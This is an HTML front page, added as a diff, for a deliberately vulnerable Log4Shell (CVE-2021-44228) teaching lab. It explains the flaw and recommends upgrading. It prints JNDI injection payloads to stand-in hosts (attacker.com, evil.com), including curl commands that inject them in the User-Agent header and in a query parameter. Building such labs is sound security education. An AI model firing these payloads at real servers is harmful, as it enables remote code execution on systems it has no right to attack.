@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CVE-2021-44228 Log4Shell 漏洞演示</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 900px;
+            width: 100%;
+            padding: 40px;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .header h1 {
+            color: #333;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .header .cve-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 25px;
+            font-weight: bold;
+            font-size: 1.1em;
+            margin-bottom: 15px;
+        }
+
+        .header p {
+            color: #666;
+            font-size: 1.1em;
+            line-height: 1.6;
+        }
+
+        .warning-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-bottom: 30px;
+            border-radius: 5px;
+        }
+
+        .warning-box strong {
+            color: #856404;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .warning-box p {
+            color: #856404;
+            margin: 0;
+        }
+
+        .info-section {
+            margin-bottom: 30px;
+        }
+
+        .info-section h2 {
+            color: #667eea;
+            font-size: 1.5em;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #667eea;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .info-card {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #667eea;
+        }
+
+        .info-card h3 {
+            color: #333;
+            font-size: 1.1em;
+            margin-bottom: 10px;
+        }
+
+        .info-card p {
+            color: #666;
+            line-height: 1.6;
+        }
+
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 20px;
+            border-radius: 10px;
+            overflow-x: auto;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+
+        .code-block code {
+            display: block;
+            white-space: pre;
+        }
+
+        .endpoint-list {
+            list-style: none;
+        }
+
+        .endpoint-list li {
+            background: #f8f9fa;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            border-left: 4px solid #28a745;
+        }
+
+        .endpoint-list li strong {
+            color: #667eea;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .endpoint-list li code {
+            background: #e9ecef;
+            padding: 2px 8px;
+            border-radius: 4px;
+            color: #d63384;
+        }
+
+        .test-section {
+            background: #e7f3ff;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+
+        .test-section h3 {
+            color: #0056b3;
+            margin-bottom: 15px;
+        }
+
+        .button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 1em;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin: 5px;
+        }
+
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #dee2e6;
+            color: #666;
+        }
+
+        .status {
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 15px;
+            font-size: 0.9em;
+            font-weight: bold;
+        }
+
+        .status.vulnerable {
+            background: #f8d7da;
+            color: #721c24;
+        }
+
+        .status.safe {
+            background: #d4edda;
+            color: #155724;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🐛 Log4Shell 漏洞演示</h1>
+            <div class="cve-badge">CVE-2021-44228</div>
+            <p>这是一个用于学习和研究的 Log4j2 远程代码执行漏洞演示环境</p>
+        </div>
+
+        <div class="warning-box">
+            <strong>⚠️ 安全警告</strong>
+            <p>此应用仅用于安全研究和教育目的。请勿在生产环境中使用！当前使用的是存在严重安全漏洞的 Log4j 2.14.1 版本。</p>
+        </div>
+
+        <div class="info-section">
+            <h2>📋 环境信息</h2>
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>Spring Boot 版本</h3>
+                    <p><strong>2.6.1</strong></p>
+                    <span class="status vulnerable">易受攻击</span>
+                </div>
+                <div class="info-card">
+                    <h3>Log4j2 版本</h3>
+                    <p><strong>2.14.1</strong></p>
+                    <span class="status vulnerable">易受攻击</span>
+                </div>
+                <div class="info-card">
+                    <h3>Java 版本</h3>
+                    <p><strong>Java 8 (JDK 1.8)</strong></p>
+                </div>
+            </div>
+        </div>
+
+        <div class="info-section">
+            <h2>🎯 漏洞端点</h2>
+            <ul class="endpoint-list">
+                <li>
+                    <strong>GET /api/log</strong>
+                    <p>通过 User-Agent 请求头触发漏洞</p>
+                    <code>curl -H "User-Agent: ${jndi:ldap://attacker.com/a}" http://localhost:8080/api/log</code>
+                </li>
+                <li>
+                    <strong>GET /api/search?query=...</strong>
+                    <p>通过查询参数触发漏洞</p>
+                    <code>curl "http://localhost:8080/api/search?query=\${jndi:ldap://attacker.com/a}"</code>
+                </li>
+                <li>
+                    <strong>GET /api/health</strong>
+                    <p>健康检查端点（无漏洞）</p>
+                    <code>curl http://localhost:8080/api/health</code>
+                </li>
+            </ul>
+        </div>
+
+        <div class="info-section">
+            <h2>💡 漏洞原理</h2>
+            <p style="margin-bottom: 15px; color: #666; line-height: 1.8;">
+                Log4Shell (CVE-2021-44228) 是 Apache Log4j2 中的一个严重漏洞。当应用程序记录包含特殊格式字符串的用户输入时，
+                Log4j2 会解析 JNDI 查找表达式，攻击者可以利用此特性执行远程代码。
+            </p>
+            <div class="code-block">
+                <code>// 攻击载荷示例
+${jndi:ldap://evil.com/a}
+${jndi:rmi://evil.com/a}
+${jndi:dns://evil.com/a}
+
+// Log4j2 会尝试连接到指定的服务器
+// 并执行返回的恶意代码</code>
+            </div>
+        </div>
+
+        <div class="test-section">
+            <h3>🧪 快速测试</h3>
+            <p style="margin-bottom: 15px; color: #0056b3;">点击下方按钮测试各个端点：</p>
+            <button class="button" onclick="testHealth()">测试健康检查</button>
+            <button class="button" onclick="testLog()">测试日志端点</button>
+            <button class="button" onclick="testSearch()">测试搜索端点</button>
+            <div id="result" style="margin-top: 15px; padding: 15px; background: white; border-radius: 8px; display: none;">
+                <strong>响应结果：</strong>
+                <pre id="resultContent" style="margin-top: 10px; color: #333;"></pre>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>🔒 仅供安全研究和教育使用 | 请负责任地使用此工具</p>
+            <p style="margin-top: 10px; font-size: 0.9em;">
+                修复建议：升级 Log4j2 到 2.17.1 或更高版本
+            </p>
+        </div>
+    </div>
+
+    <script>
+        function showResult(data) {
+            const resultDiv = document.getElementById('result');
+            const resultContent = document.getElementById('resultContent');
+            resultContent.textContent = JSON.stringify(data, null, 2);
+            resultDiv.style.display = 'block';
+        }
+
+        async function testHealth() {
+            try {
+                const response = await fetch('/api/health');
+                const data = await response.text();
+                showResult({ status: response.status, data: data });
+            } catch (error) {
+                showResult({ error: error.message });
+            }
+        }
+
+        async function testLog() {
+            try {
+                const response = await fetch('/api/log', {
+                    headers: {
+                        'User-Agent': 'Test-Agent-${java:version}'
+                    }
+                });
+                const data = await response.text();
+                showResult({ status: response.status, data: data, note: '检查服务器日志查看 User-Agent 记录' });
+            } catch (error) {
+                showResult({ error: error.message });
+            }
+        }
+
+        async function testSearch() {
+            try {
+                const response = await fetch('/api/search?query=test-${java:os}');
+                const data = await response.text();
+                showResult({ status: response.status, data: data, note: '检查服务器日志查看查询记录' });
+            } catch (error) {
+                showResult({ error: error.message });
+            }
+        }
+    </script>
+</body>
+</html>
